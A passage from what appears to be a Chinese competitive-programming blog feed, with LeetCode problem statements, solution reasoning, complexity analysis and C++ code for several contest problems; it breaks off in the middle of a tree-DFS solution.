<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：nums = [1,3,5,2,7,5], minK = 1, maxK = 5</span><br><span class="line">输出：2</span><br><span class="line">解释：定界子数组是 [1,3,5] 和 [1,3,5,2] 。</span><br></pre></td></tr></table></figure>
<p>示例 2：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：nums = [1,1,1,1], minK = 1, maxK = 1</span><br><span class="line">输出：10</span><br><span class="line">解释：nums 的每个子数组都是一个定界子数组。共有 10 个子数组。</span><br></pre></td></tr></table></figure>

<p>提示：</p>
<ul>
<li><code>2 &lt;= nums.length &lt;= 105</code></li>
<li><code>1 &lt;= nums[i], minK, maxK &lt;= 106</code></li>
</ul>
<h4 id="地址-3"><a href="#地址-3" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/problems/count-subarrays-with-fixed-bounds/">https://leetcode.cn/problems/count-subarrays-with-fixed-bounds/</a></p>
<h4 id="题意-3"><a href="#题意-3" class="headerlink" title="题意"></a>题意</h4><blockquote>
<p> 动态规划</p>
</blockquote>
<h4 id="思路-3"><a href="#思路-3" class="headerlink" title="思路"></a>思路</h4><ol>
<li>当然如果满足 $minK &#x3D; maxK$ 则这个题目就非常简单了，我们直接统计 $maxK$ 的连续数字即可。如果 $minK &#x3D; maxK$ 时间，我们设 $dp[i][0]$ 表示以 $i$ 为结尾且连续子数组种所有的元素范围均在 $(minK, maxK)$ 之间的数目，$dp[i][1]$ 表示以 $i$ 为结尾且连续子数组且包含 $minK$ 且不包含 $maxK$ 的数目，$dp[i][2]$ 表示以 $i$ 为结尾且连续子数组且包含 $maxK$ 且不包含 $minK$ 的数目，$dp[i][3]$ 表示以 $i$ 为结尾且连续子数组且包含 $mink, maxK$ 的数目, 则可以有如下三种判断:</li>
</ol>
<ul>
<li><p>当 $ minK \le num[i] \le maxK$ 时，则此时可以知道<br>$$<br>dp[i][0] &#x3D; dp[i-1][0] + 1\<br>dp[i][1] &#x3D; dp[i-1][1] \<br>dp[i][2] &#x3D; dp[i-1][2] \<br>dp[i][3] &#x3D; dp[i-1][3]<br>$$</p>
</li>
<li><p>当 $ minK &#x3D; num[i]$ 时，则此时可以知道:<br>$$<br>dp[i][1] &#x3D; dp[i - 1][0] + dp[i - 1][1] + 1 \<br>dp[i][3] &#x3D; dp[i - 1][3] + dp[i - 1][2]<br>$$</p>
</li>
<li><p>当 $ maxK &#x3D; num[i]$ 时，则此时可以知道:<br>$$<br>dp[i][2] &#x3D; dp[i - 1][0] + dp[i - 1][2] + 1 \<br>dp[i][3] &#x3D; dp[i - 1][3] + dp[i - 1][1]<br>$$</p>
</li>
</ul>
<ol start="2">
<li>非常好容易理解的解法如下，设以 $i$ 为右端点的连续子树的数目为 $cnt[i]$，则此时可以知道在合法的连续子数组中一定含有 $maxK, mink$ 且其中所有的元素均满足大于等于 $minK$，且小于等于 $maxK$。则此时我们应当取 $j &#x3D; \min(minIdx, maxId)$，即距离 $i$ 最近且同时出现 $minK,maxk$ 的索引为 $j$，如果距离 $i$ 最近的非法数字的索引为 $validIdx$：</li>
</ol>
<ul>
<li>如果 $validIdx &lt; j$，此时可以构造的合法的连续子数组的数目为 $j - validIdx$；</li>
<li>如果 $validIdx \ge j$，此时可以构造的合法的连续子数组的数目为 $0$；</li>
</ul>
<ol start="2">
<li>复杂度分析：</li>
</ol>
<ul>
<li>时间复杂度：$O(n)$，其中 $n$ 表示数组的长度。</li>
<li>空间复杂度：$O(1)$。</li>
</ul>
<h4 id="代码-3"><a href="#代码-3" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">long</span> <span class="type">long</span> <span class="title">countSubarrays</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums, <span class="type">int</span> minK, <span class="type">int</span> maxK)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n = nums.<span class="built_in">size</span>();</span><br><span class="line">        vector&lt;vector&lt;<span class="type">long</span> <span class="type">long</span>&gt;&gt; <span class="built_in">dp</span>(n + <span class="number">1</span>, <span class="built_in">vector</span>&lt;<span class="type">long</span> <span class="type">long</span>&gt;(<span class="number">4</span>));</span><br><span class="line">        <span class="keyword">if</span> (minK != maxK) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (nums[i - <span class="number">1</span>] &gt;= minK &amp;&amp; nums[i - <span class="number">1</span>] &lt;= maxK) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (nums[i - <span class="number">1</span>] &gt; minK &amp;&amp; nums[i - <span class="number">1</span>] &lt; maxK) &#123;</span><br><span class="line">                        dp[i][<span class="number">0</span>] = dp[i - <span class="number">1</span>][<span class="number">0</span>] + <span class="number">1</span>;</span><br><span class="line">                        dp[i][<span class="number">1</span>] = dp[i - <span class="number">1</span>][<span class="number">1</span>];</span><br><span class="line">                        dp[i][<span class="number">2</span>] = dp[i - <span class="number">1</span>][<span class="number">2</span>];</span><br><span class="line">                        dp[i][<span class="number">3</span>] = dp[i - <span class="number">1</span>][<span class="number">3</span>];</span><br><span class="line">                    &#125; </span><br><span class="line">                    <span class="keyword">if</span> (nums[i - <span class="number">1</span>] == minK) &#123;</span><br><span class="line">                        dp[i][<span class="number">1</span>] = dp[i - <span class="number">1</span>][<span class="number">0</span>] + dp[i - <span class="number">1</span>][<span class="number">1</span>] + <span class="number">1</span>;</span><br><span class="line">                        dp[i][<span class="number">3</span>] = dp[i - <span class="number">1</span>][<span class="number">3</span>] + dp[i - <span class="number">1</span>][<span class="number">2</span>]; </span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span> (nums[i - <span class="number">1</span>] == maxK) &#123;</span><br><span class="line">                        dp[i][<span class="number">2</span>] = dp[i - <span class="number">1</span>][<span class="number">0</span>] + dp[i - <span class="number">1</span>][<span class="number">2</span>] + <span class="number">1</span>;</span><br><span class="line">                        dp[i][<span class="number">3</span>] = dp[i - <span class="number">1</span>][<span class="number">3</span>] + dp[i - <span class="number">1</span>][<span class="number">1</span>];</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; </span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (nums[i - <span class="number">1</span>] == minK) &#123;</span><br><span class="line">                    dp[i][<span class="number">3</span>] = dp[i<span class="number">-1</span>][<span class="number">3</span>] + <span class="number">1</span>;</span><br><span class="line">                &#125; </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">long</span> <span class="type">long</span> ans = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">            ans += dp[i][<span class="number">3</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<ul>
<li>直接检测<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">long</span> <span class="type">long</span> <span class="title">countSubarrays</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums, <span class="type">int</span> minK, <span class="type">int</span> maxK)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n = nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> minIdx = <span class="number">-1</span>, maxIdx = <span class="number">-1</span>, validIdx = <span class="number">-1</span>;</span><br><span class="line">        <span class="type">long</span> <span class="type">long</span> ans = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (nums[i] == minK) minIdx = i;</span><br><span class="line">            <span class="keyword">if</span> (nums[i] == maxK) maxIdx = i;</span><br><span class="line">            <span class="keyword">if</span> (nums[i] &gt; maxK || nums[i] &lt; minK) validIdx = i;</span><br><span class="line">            ans += <span class="built_in">max</span>(<span class="number">0</span>, <span class="built_in">min</span>(minIdx, maxIdx) - validIdx); </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>欢迎关注和打赏，感谢支持！</p>
<ul>
<li>关注我的博客: <a href="http://mikemeng.org/">http://mikemeng.org/</a></li>
<li>关注我的知乎：<a href="https://www.zhihu.com/people/da-hua-niu">https://www.zhihu.com/people/da-hua-niu</a></li>
<li>关注我的微信公众号: 公务程序猿<br><img src="https://raw.githubusercontent.com/mike-box/pic/main/202210080853104.png" alt="1"></li>
</ul>
]]></content>
      <categories>
        <category>力扣周赛</category>
      </categories>
      <tags>
        <tag>力扣周赛</tag>
      </tags>
  </entry>
  <entry>
    <title>leetcode  biweekly contest 88</title>
    <url>/2022/11/02/%E5%8A%9B%E6%89%A3%E5%91%A8%E8%B5%9B%E9%A2%98%E8%A7%A3/44/</url>
    <content><![CDATA[<h2 id="leetcode-biweekly-contest-88"><a href="#leetcode-biweekly-contest-88" class="headerlink" title="leetcode  biweekly contest 88"></a>leetcode  biweekly contest 88</h2><p>前三题确实都是常规题目，第四题出的不是很好。</p>
<h4 id="6208-有效时间的数目"><a href="#6208-有效时间的数目" class="headerlink" title="6208. 有效时间的数目"></a>6208. 有效时间的数目</h4><h4 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h4><p>给你一个长度为 <code>5</code> 的字符串 <code>time</code> ，表示一个电子时钟当前的时间，格式为 <code>&quot;hh:mm&quot;</code> 。最早 可能的时间是 <code>&quot;00:00&quot;</code> ，最晚 可能的时间是 <code>&quot;23:59&quot;</code> 。</p>
<p>在字符串 <code>time</code> 中，被字符 <code>?</code> 替换掉的数位是 未知的 ，被替换的数字可能是 0 到 9 中的任何一个。</p>
<p>请你返回一个整数 <code>answer</code> ，将每一个 <code>?</code> 都用 <code>0</code> 到 <code>9</code> 中一个数字替换后，可以得到的有效时间的数目。</p>
<p>示例 1：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：time = &quot;?5:00&quot;</span><br><span class="line">输出：2</span><br><span class="line">解释：我们可以将 ? 替换成 0 或 1 ，得到 &quot;05:00&quot; 或者 &quot;15:00&quot; 。注意我们不能替换成 2 ，因为时间 &quot;25:00&quot; 是无效时间。所以我们有两个选择。</span><br></pre></td></tr></table></figure>
<p>示例 2：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：time = &quot;0?:0?&quot;</span><br><span class="line">输出：100</span><br><span class="line">解释：两个 ? 都可以被 0 到 9 之间的任意数字替换，所以我们总共有 100 种选择。</span><br></pre></td></tr></table></figure>
<p>示例 3：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：time = &quot;??:??&quot;</span><br><span class="line">输出：1440</span><br><span class="line">解释：小时总共有 24 种选择，分钟总共有 60 种选择。所以总共有 24 * 60 = 1440 种选择。</span><br></pre></td></tr></table></figure>

<p>提示：</p>
<ul>
<li><code>time</code> 是一个长度为 <code>5</code> 的有效字符串，格式为 <code>&quot;hh:mm&quot;</code> 。</li>
<li><code>&quot;00&quot; &lt;= hh &lt;= &quot;23&quot;</code></li>
<li><code>&quot;00&quot; &lt;= mm &lt;= &quot;59&quot;</code></li>
<li>字符串中有的数位是 <code>&#39;?&#39;</code> ，需要用 <code>0</code> 到 <code>9 </code>之间的数字替换。</li>
</ul>
<h4 id="地址"><a href="#地址" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/problems/number-of-valid-clock-times/">https://leetcode.cn/problems/number-of-valid-clock-times/</a></p>
<h4 id="题意"><a href="#题意" class="headerlink" title="题意"></a>题意</h4><pre><code>直接模拟
</code></pre>
<h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><ol>
<li>总共也就 <code>1440</code> 种状态，直接暴力搜索即可。</li>
<li>复杂度分析：</li>
</ol>
<ul>
<li>时间复杂度：$O(10^n)$。</li>
<li>空间复杂度：$O(n)$。</li>
</ul>
<h4 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">dfs</span><span class="params">(string &amp;s, <span class="type">int</span> pos, <span class="type">int</span> &amp;res)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (pos == s.<span class="built_in">size</span>()) &#123;</span><br><span class="line">            <span class="type">int</span> h = (s[<span class="number">0</span>] - <span class="string">&#x27;0&#x27;</span>)*<span class="number">10</span> + s[<span class="number">1</span>] - <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">            <span class="type">int</span> m = (s[<span class="number">3</span>] - <span class="string">&#x27;0&#x27;</span>)*<span class="number">10</span> + s[<span class="number">4</span>] - <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">            <span class="keyword">if</span> (h &lt; <span class="number">24</span> &amp;&amp; m &lt; <span class="number">60</span>) &#123;</span><br><span class="line">                res++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (s[pos] == <span class="string">&#x27;?&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt;= <span class="number">9</span>; i++) &#123;</span><br><span class="line">                s[pos] = <span class="string">&#x27;0&#x27;</span> + i;</span><br><span class="line">                <span class="built_in">dfs</span>(s, pos + <span class="number">1</span>, res);</span><br><span class="line">                s[pos] = <span class="string">&#x27;?&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">dfs</span>(s, pos + <span class="number">1</span>, res);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">countTime</span><span class="params">(string time)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> ans = <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">dfs</span>(time, <span class="number">0</span>, ans);</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="6209-二的幂数组中查询范围内的乘积"><a href="#6209-二的幂数组中查询范围内的乘积" class="headerlink" title="6209. 二的幂数组中查询范围内的乘积"></a>6209. 二的幂数组中查询范围内的乘积</h3><h4 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h4><p>给你一个正整数 <code>n</code> ，你需要找到一个下标从 <code>0</code> 开始的数组 <code>powers</code> ，它包含 最少 数目的 <code>2</code> 的幂，且它们的和为 <code>n</code> 。<code>powers</code> 数组是 非递减 顺序的。根据前面描述，构造 <code>powers</code> 数组的方法是唯一的。</p>
<p>同时给你一个下标从 <code>0</code> 开始的二维整数数组 <code>queries</code> ，其中 <code>queries[i] = [lefti, righti]</code> ，其中 <code>queries[i]</code> 表示请你求出满足 <code>lefti &lt;= j &lt;= righti</code> 的所有 <code>powers[j]</code> 的乘积。</p>
<p>请你返回一个数组 <code>answers</code> ，长度与 <code>queries</code> 的长度相同，其中 <code>answers[i]</code>是第 <code>i</code> 个查询的答案。由于查询的结果可能非常大，请你将每个 <code>answers[i]</code> 都对 <code>109 + 7</code> 取余 。</p>
<p>示例 1：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：n = 15, queries = [[0,1],[2,2],[0,3]]</span><br><span class="line">输出：[2,4,64]</span><br><span class="line">解释：</span><br><span class="line">对于 n = 15 ，得到 powers = [1,2,4,8] 。没法得到元素数目更少的数组。</span><br><span class="line">第 1 个查询的答案：powers[0] * powers[1] = 1 * 2 = 2 。</span><br><span class="line">第 2 个查询的答案：powers[2] = 4 。</span><br><span class="line">第 3 个查询的答案：powers[0] * powers[1] * powers[2] * powers[3] = 1 * 2 * 4 * 8 = 64 。</span><br><span class="line">每个答案对 109 + 7 得到的结果都相同，所以返回 [2,4,64] 。</span><br></pre></td></tr></table></figure>
<p>示例 2：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：n = 2, queries = [[0,0]]</span><br><span class="line">输出：[2]</span><br><span class="line">解释：</span><br><span class="line">对于 n = 2, powers = [2] 。</span><br><span class="line">唯一一个查询的答案是 powers[0] = 2 。答案对 109 + 7 取余后结果相同，所以返回 [2] 。</span><br></pre></td></tr></table></figure>
<p>提示：</p>
<ul>
<li><code>1 &lt;= n &lt;= 109</code></li>
<li><code>1 &lt;= queries.length &lt;= 105</code></li>
<li><code>0 &lt;= starti &lt;= endi &lt; powers.length</code></li>
</ul>
<h4 id="地址-1"><a href="#地址-1" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/problems/find-the-original-array-of-prefix-xor/">https://leetcode.cn/problems/find-the-original-array-of-prefix-xor/</a></p>
<h4 id="题意-1"><a href="#题意-1" class="headerlink" title="题意"></a>题意</h4><pre><code>数学问题
</code></pre>
<h4 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h4><ol>
<li>将一个整数拆分成 $2$ 的幂的很容易，直接拆分即可，根据二进制的定义可以知道，一个整数最多可以拆分为 $32$ 个 $2$ 的幂数，然后按照题目要求求出连乘的积即可。</li>
<li>复杂度分析：</li>
</ol>
<ul>
<li>时间复杂度：时间复杂度为 $O(log n + m \log n)$，其中 $m$ 表示数组的长度，$n$ 表示给定的数。</li>
<li>空间复杂度：空间复杂度为 $O(\log n)$。</li>
</ul>
<h4 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">productQueries</span><span class="params">(<span class="type">int</span> n, vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; queries)</span> </span>&#123;</span><br><span class="line">        vector&lt;<span class="type">int</span>&gt; arr;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (n &amp; (<span class="number">1</span> &lt;&lt; i)) &#123;</span><br><span class="line">                arr.<span class="built_in">emplace_back</span>(<span class="number">1</span> &lt;&lt; i);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">long</span> <span class="type">long</span> mod = <span class="number">1e9</span> + <span class="number">7</span>;</span><br><span class="line">        vector&lt;<span class="type">int</span>&gt; ans;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; queries.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">            <span class="type">int</span> x = queries[i][<span class="number">0</span>];</span><br><span class="line">            <span class="type">int</span> y = queries[i][<span class="number">1</span>];</span><br><span class="line">            <span class="type">long</span> <span class="type">long</span> curr = <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = x; j &lt;= y; j++) &#123;</span><br><span class="line">                curr = (curr * arr[j]) % mod;</span><br><span class="line">            &#125;</span><br><span class="line">            ans.<span class="built_in">emplace_back</span>(curr);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="6210-最小化数组中的最大值"><a href="#6210-最小化数组中的最大值" class="headerlink" title="6210. 最小化数组中的最大值"></a>6210. 最小化数组中的最大值</h3><h4 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h4><p>给你一个下标从 <code>0</code> 开始的数组 <code>nums</code> ，它含有 <code>n</code> 个非负整数。</p>
<p>每一步操作中，你需要：</p>
<ul>
<li>选择一个满足 <code>1 &lt;= i &lt; n</code> 的整数 <code>i</code> ，且 <code>nums[i] &gt; 0 </code>。</li>
<li>将 <code>nums[i]</code> 减 <code>1</code> 。</li>
<li>将 <code>nums[i - 1]</code> 加 <code>1</code> 。<br>你可以对数组执行 任意 次上述操作，请你返回可以得到的 <code>nums</code> 数组中 最大值 最小 为多少。</li>
</ul>
<p>示例 1：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：nums = [3,7,1,6]</span><br><span class="line">输出：5</span><br><span class="line">解释：</span><br><span class="line">一串最优操作是：</span><br><span class="line">1. 选择 i = 1 ，nums 变为 [4,6,1,6] 。</span><br><span class="line">2. 选择 i = 3 ，nums 变为 [4,6,2,5] 。</span><br><span class="line">3. 选择 i = 1 ，nums 变为 [5,5,2,5] 。</span><br><span class="line">nums 中最大值为 5 。无法得到比 5 更小的最大值。</span><br><span class="line">所以我们返回 5 。</span><br></pre></td></tr></table></figure>
<p>示例 2：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：nums = [10,1]</span><br><span class="line">输出：10</span><br><span class="line">解释：</span><br><span class="line">最优解是不改动 nums ，10 是最大值，所以返回 10 。</span><br></pre></td></tr></table></figure>

<p>提示：</p>
<ul>
<li><code>n == nums.length</code></li>
<li><code>2 &lt;= n &lt;= 105</code></li>
<li><code>0 &lt;= nums[i] &lt;= 109</code></li>
</ul>
<h4 id="地址-2"><a href="#地址-2" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/problems/minimize-maximum-of-array/">https://leetcode.cn/problems/minimize-maximum-of-array/</a></p>
<h4 id="题意-2"><a href="#题意-2" class="headerlink" title="题意"></a>题意</h4><pre><code>数学方法
</code></pre>
<h4 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h4><ol>
<li>典型的贪心算法，我们知道如果想将 $nums[i]$ 进行减小，只能将 $i$ 之前的元素进行减小，因此我们知道前 $i$ 个数通过变换之后最小的元素也只能变为前 $i$ 个元素的平均值，否则一定会出现一个大于平均值的元素，因此我们尝试求出该序列的前 $i$ 个元素的平均值的最大值即为可能变换出来的最小值。因为我们无论如何进行变换均不能将前 $i$ 个元素的最大值变为前 $i$ 个元素平均值之下。</li>
<li>复杂度分析</li>
</ol>
<ul>
<li>时间复杂度：时间复杂度为 $O(n)$，$n$ 为数组的长度。</li>
<li>空间复杂度：时间复杂度为 $O(1)$。</li>
</ul>
<h4 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">minimizeArrayValue</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="type">long</span> <span class="type">long</span> ans = nums[<span class="number">0</span>];</span><br><span class="line">        <span class="type">long</span> <span class="type">long</span> sum = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; nums.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">            sum += nums[i];</span><br><span class="line">            ans = <span class="built_in">max</span>(ans, (sum + i) / (i + <span class="number">1</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="6211-创建价值相同的连通块"><a href="#6211-创建价值相同的连通块" class="headerlink" title="6211. 创建价值相同的连通块"></a>6211. 创建价值相同的连通块</h3><h4 id="题目-3"><a href="#题目-3" class="headerlink" title="题目"></a>题目</h4><p>有一棵 <code>n</code> 个节点的无向树，节点编号为 <code>0</code> 到 <code>n - 1</code> 。</p>
<p>给你一个长度为 <code>n</code> 下标从 <code>0</code> 开始的整数数组 <code>nums</code> ，其中 <code>nums[i]</code> 表示第 <code>i</code> 个节点的值。同时给你一个长度为 <code>n - 1</code> 的二维整数数组 <code>edges</code> ，其中 <code>edges[i] = [ai, bi]</code> 表示节点<code>ai</code>与 <code>bi</code> 之间有一条边。</p>
<p>你可以 删除 一些边，将这棵树分成几个连通块。一个连通块的 价值 定义为这个连通块中 所有 节点 <code>i</code> 对应的 <code>nums[i]</code> 之和。</p>
<p>你需要删除一些边，删除后得到的各个连通块的价值都相等。请返回你可以删除的边数 最多 为多少。</p>
<p>示例 1：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：nums = [6,2,2,2,6], edges = [[0,1],[1,2],[1,3],[3,4]] </span><br><span class="line">输出：2 </span><br><span class="line">解释：上图展示了我们可以删除边 [0,1] 和 [3,4] 。得到的连通块为 [0] ，[1,2,3] 和 [4] 。每个连通块的价值都为 6 。可以证明没有别的更好的删除方案存在了，所以答案为 2 。</span><br></pre></td></tr></table></figure>
<p>示例 2：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：nums = [2], edges = []</span><br><span class="line">输出：0</span><br><span class="line">解释：没有任何边可以删除。</span><br></pre></td></tr></table></figure>

<p>提示：</p>
<ul>
<li><code>1 &lt;= n &lt;= 2 * 104</code></li>
<li><code>nums.length == n</code></li>
<li><code>1 &lt;= nums[i] &lt;= 50</code></li>
<li><code>edges.length == n - 1</code></li>
<li><code>edges[i].length == 2</code></li>
<li><code>0 &lt;= edges[i][0], edges[i][1] &lt;= n - 1</code></li>
<li><code>edges</code> 表示一棵合法的树。</li>
</ul>
<h4 id="地址-3"><a href="#地址-3" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/problems/create-components-with-same-value/">https://leetcode.cn/problems/create-components-with-same-value/</a></p>
<h4 id="题意-3"><a href="#题意-3" class="headerlink" title="题意"></a>题意</h4><blockquote>
<p> 深度优先搜索</p>
</blockquote>
<h4 id="思路-3"><a href="#思路-3" class="headerlink" title="思路"></a>思路</h4><ol>
<li>我们知道一个数 $x$ 的最多可能有 $d(x)$ 个不同的因子，因此我们直接尝试所有可能的因子即可。我们尝试将树分为 $k$ 部分，则每部分的和为 $\dfrac{\sum \limits _{i&#x3D;0}^{n-1}nums[i]}{k}$，所以我们可以尝试的次数最多约为 $d(\sum \limits _{i&#x3D;0}^{n-1}nums[i])$。</li>
<li>当然最重要的是要检测树是否可以被分为 $k$ 个子模块，此时我们需要用深度优先搜索来检测。感觉比较难写的倒是这个 <code>DFS</code> 检测算法不是很好写。非常经典的一个树的遍历的算法。</li>
<li>复杂度分析：</li>
</ol>
<ul>
<li>时间复杂度：$O(d(sum) \times n)$，其中 $n$ 表示给定的数组的长度。</li>
<li>空间复杂度：$O(n)$，其中 $n$ 表示给定的数组的长度。</li>
</ul>
<h4 id="代码-3"><a href="#代码-3" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">componentValue</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums, vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; edges)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n = nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> tot = <span class="number">0</span>;</span><br><span class="line">        vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">graph</span>(n);</span><br><span class="line">        tot = <span class="built_in">accumulate</span>(nums.<span class="built_in">begin</span>(), nums.<span class="built_in">end</span>(), <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span> v : edges) &#123;</span><br><span class="line">            graph[v[<span class="number">0</span>]].<span class="built_in">emplace_back</span>(v[<span class="number">1</span>]);</span><br><span class="line">            graph[v[<span class="number">1</span>]].<span class="built_in">emplace_back</span>(v[<span class="number">0</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        function&lt;<span class="type">int</span>(<span class="type">int</span>, <span class="type">int</span>, <span class="type">int</span>)&gt; dfs = [&amp;](<span class="type">int</span> from, <span class="type">int</span> to, <span class="type">int</span> target) &#123;</span><br><span class="line">            <span class="type">int</span> sum = nums[to];</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">auto</span> v : graph[to]) &#123;</span><br><span class="line">                <span class="keyword">if</span> (v == from) <span class="keyword">continue</span>;</span><br><span class="line">                <span class="type">int</span> res = <span class="built_in">dfs</span>(to, v, target);</span><br><span class="line">                <span class="keyword">if</span> (res &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                sum += res;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (sum 